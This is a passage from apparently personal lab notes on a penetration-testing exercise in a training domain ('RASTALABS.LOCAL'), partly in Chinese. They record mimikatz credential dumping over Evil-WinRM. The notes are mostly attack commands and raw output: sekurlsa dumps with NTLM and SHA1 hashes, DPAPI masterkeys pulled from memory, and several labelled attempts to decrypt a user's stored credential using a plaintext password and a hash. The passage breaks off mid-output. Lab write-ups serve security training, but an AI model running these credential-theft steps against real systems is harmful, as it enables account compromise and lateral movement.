         * Password : 8d 0a 13 6a 9b 54 19 79 5a 30 80 f7 23 e5 fa 6b 13 11 b8 d8 1b 6e 2b 56 84 fc 39 6a 93 91 b9 b8 63 d2 bc 6b f7 cf fb 8d b1 e3 66 c7 19 f7 f5 91 53 f0 3b 21 a4 b6 c1 ae 5d f3 83 27 9e 7a a9 ef 1c 7e ee c8 c3 f5 a4 1a 55 3f 31 f4 9e 2a e6 de 8c 1e cf c9 79 4e a5 2f 7f e6 02 93 b8 65 3b 02 f5 d3 32 65 b3 e9 61 d7 14 f6 9a 5b 71 e4 49 89 23 e2 a2 f6 5b 58 f3 a5 af a4 ce 35 c7 67 ac f3 16 38 0c 2b 4b 29 52 68 15 60 20 10 24 e5 f8 2f e1 b8 c4 fc 57 6a 1c 7b 59 de 6d 21 0d ec d0 db 10 4e 22 40 e9 07 99 0f 7c a2 39 78 5c a4 bc 3f 06 f2 c8 a9 20 c1 3c b2 56 a9 67 a1 62 f5 69 53 39 12 99 36 b9 64 66 98 19 f8 66 48 63 b6 8a 13 b9 b0 c8 9d 3a d3 92 60 fb 42 e5 96 4c 91 1b 12 75 27 01 58 93 ad 20 52 fe 87 d9 d8 c9 ac fa 22
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 45124 (00000000:0000b044)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 16/03/2026 03:26:10
SID               :
        msv :
         [00000003] Primary
         * Username : WS04$
         * Domain   : RLAB
         * NTLM     : 69a5dd0c98b0f2c0ebfc642cbabb89f0
         * SHA1     : 1618ef7efa37693487ded4cdbf70002f23ac3d86
         * DPAPI    : 1618ef7efa37693487ded4cdbf70002f
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WS04$
Domain            : RLAB
Logon Server      : (null)
Logon Time        : 16/03/2026 03:26:10
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : WS04$
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : ws04$
         * Domain   : RASTALABS.LOCAL
         * Password : (null)
        ssp :
        credman :
        cloudap :

mimikatz(commandline) # exit
Bye!

```

## WS04-DPAPI(无用)
### credential
```bash
  # 1. 看 bowen 有没有自己的 credential 文件
  Get-ChildItem -Hidden C:\Users\bowen\AppData\Roaming\Microsoft\Credentials\

  # 2. 看 bowen 的 masterkey 目录
  Get-ChildItem -Hidden
  "C:\Users\bowen\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396373213-2872852198-2033860859-1152\"
```

```bash
*Evil-WinRM* PS C:\Users\Public> Get-ChildItem -Hidden C:\Users\bowen\AppData\Roaming\Microsoft\Credentials\


    Directory: C:\Users\bowen\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-        11/15/2017  10:03 AM            382 2D44DF6A63EF13B1C48D6A137074030E
```

```bash
*Evil-WinRM* PS C:\Users\Public> Get-ChildItem -Hidden "C:\Users\bowen\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396373213-2872852198-2033860859-1152\"


    Directory: C:\Users\bowen\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396373213-2872852198-2033860859-1152


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-         11/4/2019  11:34 AM            740 017d7a40-3435-4061-8fb9-12b55f6c2f2b
-a-hs-          5/5/2020  10:13 AM            740 1c2c7654-328f-4cab-849c-e9cd4d258f38
-a-hs-          6/3/2022  12:41 AM            740 258a84e9-3ee5-4db0-998a-4ea4aa1c06bf
-a-hs-          8/3/2020  10:14 AM            740 29967a4e-11fd-45cc-bae6-f983857a4a4b
-a-hs-         9/14/2022  12:57 PM            740 2b4b74ac-f016-49c3-be8a-4ec3e8516735
-a-hs-         6/12/2025  12:15 PM            740 3af2061f-1ca3-45ba-9f40-1278b35cb88b
-a-hs-          2/5/2019  10:04 AM            740 3eb50303-3f83-4ffa-8092-e9de82d9a9da
-a-hs-          2/4/2020   3:57 PM            740 4c9cb218-609c-4e64-9589-bac657139a3f
-a-hs-         8/28/2023   2:53 PM            740 69decff4-6a76-4a03-a7fc-0d9c2547de2e
-a-hs-         8/15/2018   8:31 PM            740 b3269c12-06f1-4ecf-81da-dde12570387a
-a-hs-        10/23/2024   3:16 PM            740 bef889d5-20a0-4ee0-ae99-3f1048962952
-a-hs-        10/21/2017  11:10 AM            920 BK-RLAB
-a-hs-         5/12/2019  12:22 PM            740 cfd10b18-829f-4ead-b2fc-d0be5f3c7f0c
-a-hs-        10/23/2017   5:22 PM            740 d9435061-0935-4557-afc9-a3eeac1d3c25
-a-hs-          8/9/2021  11:42 AM            740 f5b701d1-0043-4b59-9141-f03f12da4822
-a-hs-         3/16/2026   3:26 AM            740 ff36d9be-da5d-47ed-85d1-2849cd57166d
-a-hs-         3/16/2026   3:26 AM             24 Preferred
```

### masterkey GUID
第一步：查看 credential blob，获取它需要的 masterkey GUID

```bash
.\mimikatz.exe "privilege::debug" "dpapi::cred   /in:C:\Users\bowen\AppData\Roaming\Microsoft\Credentials\2D44DF6A63EF13B1C48D6A137074030E" "exit"
```

```bash
mimikatz(commandline) # dpapi::cred   /in:C:\Users\bowen\AppData\Roaming\Microsoft\Credentials\2D44DF6A63EF13B1C48D6A137074030E
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {d9435061-0935-4557-afc9-a3eeac1d3c25}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 0000003a - 58
  szDescription      : Enterprise Credential Data


  algCrypt           : 00006603 - 26115 (CALG_3DES)
  dwAlgCryptLen      : 000000c0 - 192
  dwSaltLen          : 00000010 - 16
  pbSalt             : c8888cd92c5dae4aef7080025e10ca11
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 00008004 - 32772 (CALG_SHA1)
  dwAlgHashLen       : 000000a0 - 160
  dwHmac2KeyLen      : 00000010 - 16
  pbHmack2Key        : d4243e92cab1aca1c34180c003bccb13
  dwDataLen          : 000000b0 - 176
  pbData             : fd644567a8942b8757f2ce57cd1e55afa17bd98dc7c7ef9c02fa07993f5102beadb70bf16f7b1997d74e575e2a2a3366ef652e080599a833a6de80fec890de040a96689912dd0afd81f8bb7c95a1196f27d3e67ff7388b5796c57acb93b1d08ad535fffca49b553f13838ef45cc1e84b7f4c7dd77ed2f4c98cdb2b510d940f4a9ecc8937e2d4608a4f37cc23b25cb6a5a4baaeb522c701f6593739c142f90d5bae2817a2a60e714bedfcc9d116b9f3ee
  dwSignLen          : 00000014 - 20
  pbSign             : 27c58b475fdccd39c91c3b6ec4ce83bfe09f0c86
```

### A：/rpc-DC(失败)
路线 A：用 /rpc 让 DC 解（推荐，因为你有 SYSTEM 权限 + 域内机器）

```bash
.\mimikatz.exe "privilege::debug" "token::elevate" "dpapi::masterkey /in:C:\Users\bowen\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396373213-2872852198-2033860859-1152\d9435061-0935-4557-afc9-a3eeac1d3c25 /rpc" "exit"
```

- /rpc 报错 0x0000000c — DC 拒绝了请求



### B：bowen密码解(失败)
```bash
.\mimikatz.exe "privilege::debug" "dpapi::masterkey /in:C:\Users\bowen\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396373213-2872852198-2033860859-1152\d9435061-0935-4557-afc9-a3eeac1d3c25 /sid:S-1-5-21-1396373213-2872852198-2033860859-1152 /password:NovakDjokovic001 /protected" "exit"
```

- /password:NovakDjokovic001 报错 — 说明这不是创建这个 masterkey 时用的密码

### C：bowen NTLM hash解(失败)
```bash
.\mimikatz.exe "privilege::debug" "dpapi::masterkey /in:C:\Users\bowen\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396   373213-2872852198-2033860859-1152\d9435061-0935-4557-afc9-a3eeac1d3c25   /sid:S-1-5-21-1396373213-2872852198-2033860859-1152 /hash:2acfc0ad1622bfbaf46324a32d0d650c /protected" "exit"
```

### D：sekurlsa::dpapi(失败)
```bash
*Evil-WinRM* PS C:\Users\Public> .\mimikatz.exe "privilege::debug" "sekurlsa::dpapi" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::dpapi

Authentication Id : 0 ; 289962 (00000000:00046caa)
Session           : Interactive from 1
User Name         : bowen
Domain            : RLAB
Logon Server      : DC01
Logon Time        : 16/03/2026 03:26:27
SID               : S-1-5-21-1396373213-2872852198-2033860859-1152
         [00000000]
         * GUID      :  {d9435061-0935-4557-afc9-a3eeac1d3c25}
         * Time      :  16/03/2026 03:28:20
         * MasterKey :  8b549928e0c7b0daa7dbe89ed104ad70a1f11f892e8381988c65dd347ea05ec72ec9ceba85514ccf8b1d5174423dcdc0cf880eca431f81b6c5839491670f1dba
         * sha1(key) :  154c03970a072ff66b610ea891712b8c8b104ecf
         [00000001]
         * GUID      :  {ff36d9be-da5d-47ed-85d1-2849cd57166d}
         * Time      :  16/03/2026 04:06:30
         * MasterKey :  41f85d1ad2dffc0cbf00c142c4bddbb4a9baa27a8efb3505879bb6297c9b0968e0e40ba5ddd5494efb2f8ff372adf7e137516859ee6f1565b80788cd7d102dbb
         * sha1(key) :  f66758f2f76844c1bf6ef57e4e3061b2d0a0c305
         [00000002]
         * GUID      :  {bef889d5-20a0-4ee0-ae99-3f1048962952}
         * Time      :  16/03/2026 03:56:29
         * MasterKey :  a37709ec5072dde54cf69f61339d10f2bc983b83ab0dbf926bebe12e6b151ffd8058dea480be7d136c73e7630bc33504397530983a77ca47bf070fdd9f9c2079
         * sha1(key) :  9c28ed9de883f29b8244f655a6ceb3e274ca14e9
         [00000003]
         * GUID      :  {69decff4-6a76-4a03-a7fc-0d9c2547de2e}
         * Time      :  16/03/2026 04:43:17
         * MasterKey :  021457ea31fd8a4aa2f1daf429b6016554028fd8ca5d3f9c80039c230036eef2afa76f00d981eb56a3def78bca88ea5c91c88b5082eadc23ac7a45c041cd9819
         * sha1(key) :  216bfe7c1febb29db65624723f852534b2fc8840
         [00000004]
         * GUID      :  {017d7a40-3435-4061-8fb9-12b55f6c2f2b}
         * Time      :  16/03/2026 03:26:36
         * MasterKey :  dbeea57fffcc0e7db53dcd10d23ff367bbfce89759bf5aa680613c0636f41642a7ebd166b66d0a8ca6fa9c45644e76a720b5c7131872b0215275ad71aa78dd63
         * sha1(key) :  85df7069c03d02fa4aafc49071d771d7431a675a


Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 16/03/2026 03:26:15
SID               : S-1-5-19


Authentication Id : 0 ; 77576 (00000000:00012f08)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 16/03/2026 03:26:14
SID               : S-1-5-90-0-1


Authentication Id : 0 ; 77558 (00000000:00012ef6)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 16/03/2026 03:26:14
SID               : S-1-5-90-0-1


Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WS04$
Domain            : RLAB
Logon Server      : (null)
Logon Time        : 16/03/2026 03:26:13
SID               : S-1-5-20


Authentication Id : 0 ; 46544 (00000000:0000b5d0)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 16/03/2026 03:26:12
SID               : S-1-5-96-0-1


Authentication Id : 0 ; 46520 (00000000:0000b5b8)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 16/03/2026 03:26:12
SID               : S-1-5-96-0-0


Authentication Id : 0 ; 45124 (00000000:0000b044)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 16/03/2026 03:26:10
SID               :


Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WS04$
Domain            : RLAB
Logon Server      : (null)
Logon Time        : 16/03/2026 03:26:10
SID               : S-1-5-18
         [00000000]
         * GUID      :  {13002145-8794-4624-b4be-9b3272d862ea}
         * Time      :  16/03/2026 08:51:04
         * MasterKey :  5782702f83be0179f1e71e69653decaaf0f24820f6370e06389c7f41017a6659c8cad7805230ef8b754d4e6877076ef012218eb253c04d41c32191e6e1aa1f70
         * sha1(key) :  b43a98c9699475fb389b709cc7a7cc60b4b1d396
         [00000001]
         * GUID      :  {37539582-503a-49e6-8b9d-441b3deedf59}
         * Time      :  16/03/2026 03:50:57
         * MasterKey :  5fd832f931e5f152ded5841e78aaf996684f4c39ff04329fa0e9215679da401fc8e734880ace1f560277fd4988a9b481d355086c742c02436202e3e242db5527
         * sha1(key) :  b005b263ade8cec915bdd7728115e948f640ed56
         [00000002]
         * GUID      :  {931f3543-f5ea-4562-acfb-83a0fce942fe}
         * Time      :  16/03/2026 03:28:20
         * MasterKey :  1ef0e3deedc64b0fa8caa6b83d03b0f52851218adf492267a4652d13283b742e167c3c1b6648f03ed94dc63d618a298471b7ad70325e0e484ee0905b8ad704c3
         * sha1(key) :  c778b7aaea5867ed740fa94360053984c4157376
         [00000003]
         * GUID      :  {917ae43a-9483-48a9-97a5-ed145c93bf01}
         * Time      :  16/03/2026 03:26:32
         * MasterKey :  3cf332fdb971745da80eb7e985f9ad537d4462e19b2f14671e615f43e6ac6934e639664ac20414f8f25cbd6cac4d2f47904c0c31ff579939e152a09a21bd4758
         * sha1(key) :  ce2d23ff2149fbb3045c6989b22fde3c663a82e6
         [00000004]
         * GUID      :  {d963f089-8a32-4812-80c6-be17ae237f3e}
         * Time      :  16/03/2026 08:50:59
         * MasterKey :  684fc7a788c0a01a02a3360b8d965df3df7161bd5deafbd27e03eb378e1733d119bed5a53a5be09370ee622e572dc35b745b0a865abce6fa38cc46cf50afa070
         * sha1(key) :  d9cca71b78adbb29d0de567935c54b382546abdd
         [00000005]
         * GUID      :  {e07a513f-906f-43fd-b15d-737d82a04a93}
         * Time      :  16/03/2026 08:50:59
         * MasterKey :  3c9fe7848e78f9b1985e57996ae22dcec84a5d39cdcebc739feab73414ce062a0451109279f7ec209e9422ff51acf164d545b155c5029ccf65d876e2bac76344
         * sha1(key) :  d09f962f6b709a44dfc870a166a1b4bd32beedc3
         [00000006]
         * GUID      :  {c2aa20d4-fc6d-4d59-8e67-63820080405d}
         * Time      :  16/03/2026 03:26:18
         * MasterKey :  234afce6ce81fddd371cdc113e0fa8ded2313d779cad9bf1c518d4ca75b207e61bf2312406e7782f33949b683a349a643402c90eaaab8215e478a656253bb9f9
         * sha1(key) :  bafe43035e8f57791c53cf3d5fded78ff03b6588
         [00000007]
         * GUID      :  {2f8e08a5-ff11-45e2-8f2c-e3e3aafb363f}
         * Time      :  16/03/2026 03:26:14
         * MasterKey :  f58674d65e2c38170cb591e98740a9709c494dc317c67eaeb8fc1f875a1c4b0b514bf2cc21e43f94bb0e5528376472ff3df958d6eff0aa1a9be8af7f52df1d5e
         * sha1(key) :  7cf3233da5045523e470bddd5c68c1181c2eb6a5
         [00000008]
         * GUID      :  {0af50e35-4750-4f0e-aca7-31f978e440f6}
         * Time      :  16/03/2026 03:26:12
         * MasterKey :  e442f7e9d56aa1c8ee6ce79d1d163551274291bcb0601aefeef315fb247164cc39c683d860d70d69d3b735b1bbb888bf498aacfbc31419945889317e87fed0d1
         * sha1(key) :  8e5769ed07eb1452178d9e6ce79d65cd4e19590e


mimikatz(commandline) # exit
Bye!
```

bowen 的 masterkey {d9435061-0935-4557-afc9-a3eeac1d3c25} 在内存里：

> 8b549928e0c7b0daa7dbe89ed104ad70a1f11f892e8381988c65dd347ea05ec72ec9ceba85514ccf8b1d5174423dcdc0cf880eca431f81b6c5839491670f1dba
>

```bash
.\mimikatz.exe "dpapi::cred /in:C:\Users\bowen\AppData\Roaming\Microsoft\Credentials\2D44DF6A63EF13B1C48D6A137074030E /masterkey:8b549928e0c7b0daa7dbe89ed104ad70a1f11f892e8381988c65dd347ea05ec72ec9ceba85514ccf8b1d5174423dcdc0cf880eca431f81b6c5839491670f1dba" "exit"
```

```bash
*Evil-WinRM* PS C:\Users\Public> .\mimikatz.exe "dpapi::cred /in:C:\Users\bowen\AppData\Roaming\Microsoft\Credentials\2D44DF6A63EF13B1C48D6A137074030E /masterkey:8b549928e0c7b0daa7dbe89ed104ad70a1f11f892e8381988c65dd347ea05ec72ec9ceba85514ccf8b1d5174423dcdc0cf880eca431f81b6c5839491670f1dba" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # dpapi::cred /in:C:\Users\bowen\AppData\Roaming\Microsoft\Credentials\2D44DF6A63EF13B1C48D6A137074030E /masterkey:8b549928e0c7b0daa7dbe89ed104ad70a1f11f892e8381988c65dd347ea05ec72ec9ceba85514ccf8b1d5174423dcdc0cf880eca431f81b6c5839491670f1dba
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {d9435061-0935-4557-afc9-a3eeac1d3c25}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 0000003a - 58
  szDescription      : Enterprise Credential Data


  algCrypt           : 00006603 - 26115 (CALG_3DES)
  dwAlgCryptLen      : 000000c0 - 192
  dwSaltLen          : 00000010 - 16
  pbSalt             : c8888cd92c5dae4aef7080025e10ca11
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 00008004 - 32772 (CALG_SHA1)
  dwAlgHashLen       : 000000a0 - 160
  dwHmac2KeyLen      : 00000010 - 16
  pbHmack2Key        : d4243e92cab1aca1c34180c003bccb13
  dwDataLen          : 000000b0 - 176
  pbData             : fd644567a8942b8757f2ce57cd1e55afa17bd98dc7c7ef9c02fa07993f5102beadb70bf16f7b1997d74e575e2a2a3366ef652e080599a833a6de80fec890de040a96689912dd0afd81f8bb7c95a1196f27d3e67ff7388b5796c57acb93b1d08ad535fffca49b553f13838ef45cc1e84b7f4c7dd77ed2f4c98cdb2b510d940f4a9ecc8937e2d4608a4f37cc23b25cb6a5a4baaeb522c701f6593739c142f90d5bae2817a2a60e714bedfcc9d116b9f3ee
  dwSignLen          : 00000014 - 20
  pbSign             : 27c58b475fdccd39c91c3b6ec4ce83bfe09f0c86

Decrypting Credential:
 * masterkey     : 8b549928e0c7b0daa7dbe89ed104ad70a1f11f892e8381988c65dd347ea05ec72ec9ceba85514ccf8b1d5174423dcdc0cf880eca431f81b6c5839491670f1dba
ERROR kull_m_dpapi_unprotect_blob ; kull_m_crypto_hkey_session (0x00000005)

mimikatz(commandline) # exit
Bye!
```

0x00000005 是 CryptoAPI 的权限/会话错误

### E：token::elevate 到 SYSTEM
```bash
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::dpapi" "d papi::cred   /in:C:\Users\bowen\AppData\Roaming\Microsoft\Credentials\2D44DF6A63EF13B1C48D6A137074030E"  "exit"
```

```bash
*Evil-WinRM* PS C:\Users\Public> .\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::dpapi" "dpapi::cred   /in:C:\Users\bowen\AppData\Roaming\Microsoft\Credentials\2D44DF6A63EF13B1C48D6A137074030E" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

612     {0;000003e7} 1 D 40016          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;0043aa9f} 0 D 6218674     WS04\Administrator      S-1-5-21-3047517631-3068848948-2267605202-500   (11g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 6260184     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)      Impersonation (Delegation)

mimikatz(commandline) # sekurlsa::dpapi

Authentication Id : 0 ; 289962 (00000000:00046caa)
Session           : Interactive from 1
User Name         : bowen
Domain            : RLAB
Logon Server      : DC01
Logon Time        : 16/03/2026 03:26:27
SID               : S-1-5-21-1396373213-2872852198-2033860859-1152
         [00000000]
         * GUID      :  {d9435061-0935-4557-afc9-a3eeac1d3c25}
         * Time      :  16/03/2026 03:28:20
         * MasterKey :  8b549928e0c7b0daa7dbe89ed104ad70a1f11f892e8381988c65dd347ea05ec72ec9ceba85514ccf8b1d5174423dcdc0cf880eca431f81b6c5839491670f1dba
         * sha1(key) :  154c03970a072ff66b610ea891712b8c8b104ecf
         [00000001]
         * GUID      :  {ff36d9be-da5d-47ed-85d1-2849cd57166d}
         * Time      :  16/03/2026 04:06:30
         * MasterKey :  41f85d1ad2dffc0cbf00c142c4bddbb4a9baa27a8efb3505879bb6297c9b0968e0e40ba5ddd5494efb2f8ff372adf7e137516859ee6f1565b80788cd7d102dbb
         * sha1(key) :  f66758f2f76844c1bf6ef57e4e3061b2d0a0c305
         [00000002]
         * GUID      :  {bef889d5-20a0-4ee0-ae99-3f1048962952}
         * Time      :  16/03/2026 03:56:29
         * MasterKey :  a37709ec5072dde54cf69f61339d10f2bc983b83ab0dbf926bebe12e6b151ffd8058dea480be7d136c73e7630bc33504397530983a77ca47bf070fdd9f9c2079
         * sha1(key) :  9c28ed9de883f29b8244f655a6ceb3e274ca14e9
         [00000003]
         * GUID      :  {69decff4-6a76-4a03-a7fc-0d9c2547de2e}
         * Time      :  16/03/2026 04:43:17
         * MasterKey :  021457ea31fd8a4aa2f1daf429b6016554028fd8ca5d3f9c80039c230036eef2afa76f00d981eb56a3def78bca88ea5c91c88b5082eadc23ac7a45c041cd9819
         * sha1(key) :  216bfe7c1febb29db65624723f852534b2fc8840
         [00000004]
         * GUID      :  {017d7a40-3435-4061-8fb9-12b55f6c2f2b}
         * Time      :  16/03/2026 03:26:36
         * MasterKey :  dbeea57fffcc0e7db53dcd10d23ff367bbfce89759bf5aa680613c0636f41642a7ebd166b66d0a8ca6fa9c45644e76a720b5c7131872b0215275ad71aa78dd63
         * sha1(key) :  85df7069c03d02fa4aafc49071d771d7431a675a


Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 16/03/2026 03:26:15
SID               : S-1-5-19


Authentication Id : 0 ; 77576 (00000000:00012f08)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 16/03/2026 03:26:14
SID               : S-1-5-90-0-1


Authentication Id : 0 ; 77558 (00000000:00012ef6)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 16/03/2026 03:26:14
SID               : S-1-5-90-0-1


Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WS04$
Domain            : RLAB
Logon Server      : (null)
Logon Time        : 16/03/2026 03:26:13
SID               : S-1-5-20


Authentication Id : 0 ; 46544 (00000000:0000b5d0)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 16/03/2026 03:26:12
SID               : S-1-5-96-0-1


Authentication Id : 0 ; 46520 (00000000:0000b5b8)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 16/03/2026 03:26:12
SID               : S-1-5-96-0-0


Authentication Id : 0 ; 45124 (00000000:0000b044)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 16/03/2026 03:26:10
SID               :


Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WS04$
Domain            : RLAB
Logon Server      : (null)
Logon Time        : 16/03/2026 03:26:10
SID               : S-1-5-18
         [00000000]
         * GUID      :  {13002145-8794-4624-b4be-9b3272d862ea}
         * Time      :  16/03/2026 08:51:04
         * MasterKey :  5782702f83be0179f1e71e69653decaaf0f24820f6370e06389c7f41017a6659c8cad7805230ef8b754d4e6877076ef012218eb253c04d41c32191e6e1aa1f70
         * sha1(key) :  b43a98c9699475fb389b709cc7a7cc60b4b1d396
         [00000001]
         * GUID      :  {37539582-503a-49e6-8b9d-441b3deedf59}
         * Time      :  16/03/2026 03:50:57
         * MasterKey :  5fd832f931e5f152ded5841e78aaf996684f4c39ff04329fa0e9215679da401fc8e734880ace1f560277fd4988a9b481d355086c742c02436202e3e242db5527
         * sha1(key) :  b005b263ade8cec915bdd7728115e948f640ed56
         [00000002]
         * GUID      :  {931f3543-f5ea-4562-acfb-83a0fce942fe}
         * Time      :  16/03/2026 03:28:20
         * MasterKey :  1ef0e3deedc64b0fa8caa6b83d03b0f52851218adf492267a4652d13283b742e167c3c1b6648f03ed94dc63d618a298471b7ad70325e0e484ee0905b8ad704c3
         * sha1(key) :  c778b7aaea5867ed740fa94360053984c4157376
         [00000003]
         * GUID      :  {917ae43a-9483-48a9-97a5-ed145c93bf01}
         * Time      :  16/03/2026 03:26:32
         * MasterKey :  3cf332fdb971745da80eb7e985f9ad537d4462e19b2f14671e615f43e6ac6934e639664ac20414f8f25cbd6cac4d2f47904c0c31ff579939e152a09a21bd4758
         * sha1(key) :  ce2d23ff2149fbb3045c6989b22fde3c663a82e6
         [00000004]
         * GUID      :  {d963f089-8a32-4812-80c6-be17ae237f3e}
         * Time      :  16/03/2026 08:50:59
         * MasterKey :  684fc7a788c0a01a02a3360b8d965df3df7161bd5deafbd27e03eb378e1733d119bed5a53a5be09370ee622e572dc35b745b0a865abce6fa38cc46cf50afa070
         * sha1(key) :  d9cca71b78adbb29d0de567935c54b382546abdd
         [00000005]
         * GUID      :  {e07a513f-906f-43fd-b15d-737d82a04a93}
         * Time      :  16/03/2026 08:50:59
         * MasterKey :  3c9fe7848e78f9b1985e57996ae22dcec84a5d39cdcebc739feab73414ce062a0451109279f7ec209e9422ff51acf164d545b155c5029ccf65d876e2bac76344
         * sha1(key) :  d09f962f6b709a44dfc870a166a1b4bd32beedc3
         [00000006]
         * GUID      :  {c2aa20d4-fc6d-4d59-8e67-63820080405d}
         * Time      :  16/03/2026 03:26:18
         * MasterKey :  234afce6ce81fddd371cdc113e0fa8ded2313d779cad9bf1c518d4ca75b207e61bf2312406e7782f33949b683a349a643402c90eaaab8215e478a656253bb9f9
         * sha1(key) :  bafe43035e8f57791c53cf3d5fded78ff03b6588
         [00000007]
         * GUID      :  {2f8e08a5-ff11-45e2-8f2c-e3e3aafb363f}
         * Time      :  16/03/2026 03:26:14
         * MasterKey :  f58674d65e2c38170cb591e98740a9709c494dc317c67eaeb8fc1f875a1c4b0b514bf2cc21e43f94bb0e5528376472ff3df958d6eff0aa1a9be8af7f52df1d5e
         * sha1(key) :  7cf3233da5045523e470bddd5c68c1181c2eb6a5
         [00000008]
         * GUID      :  {0af50e35-4750-4f0e-aca7-31f978e440f6}
         * Time      :  16/03/2026 03:26:12
         * MasterKey :  e442f7e9d56aa1c8ee6ce79d1d163551274291bcb0601aefeef315fb247164cc39c683d860d70d69d3b735b1bbb888bf498aacfbc31419945889317e87fed0d1
         * sha1(key) :  8e5769ed07eb1452178d9e6ce79d65cd4e19590e


mimikatz(commandline) # dpapi::cred   /in:C:\Users\bowen\AppData\Roaming\Microsoft\Credentials\2D44DF6A63EF13B1C48D6A137074030E
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {d9435061-0935-4557-afc9-a3eeac1d3c25}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 0000003a - 58
  szDescription      : Enterprise Credential Data


  algCrypt           : 00006603 - 26115 (CALG_3DES)
  dwAlgCryptLen      : 000000c0 - 192
  dwSaltLen          : 00000010 - 16
  pbSalt             : c8888cd92c5dae4aef7080025e10ca11
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 00008004 - 32772 (CALG_SHA1)
  dwAlgHashLen       : 000000a0 - 160
  dwHmac2KeyLen      : 00000010 - 16
  pbHmack2Key        : d4243e92cab1aca1c34180c003bccb13
